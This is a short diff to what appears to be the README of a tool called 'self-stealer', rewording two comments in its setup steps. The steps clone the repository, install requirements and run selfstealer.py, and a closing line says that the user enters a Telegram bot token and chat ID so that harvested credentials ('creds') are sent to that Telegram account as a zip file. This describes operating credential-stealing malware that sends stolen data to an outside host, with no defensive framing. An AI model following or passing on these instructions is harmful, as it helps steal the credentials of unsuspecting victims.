@@ -25,10 +25,10 @@ $ https://github.com/x5corpion/self-stealer.git
 # Go into the repository
 $ cd self-stealer
 
-# Install dependencies required by the server
+# Install dependencies that are required
 $ pip install -r requirements.txt
 
-# Start the GUI
+# Start the program
 $ python selfstealer.py
 
 # You will enter your telegram bot token and chat Id there and creds will be sent to your telegram in zip format
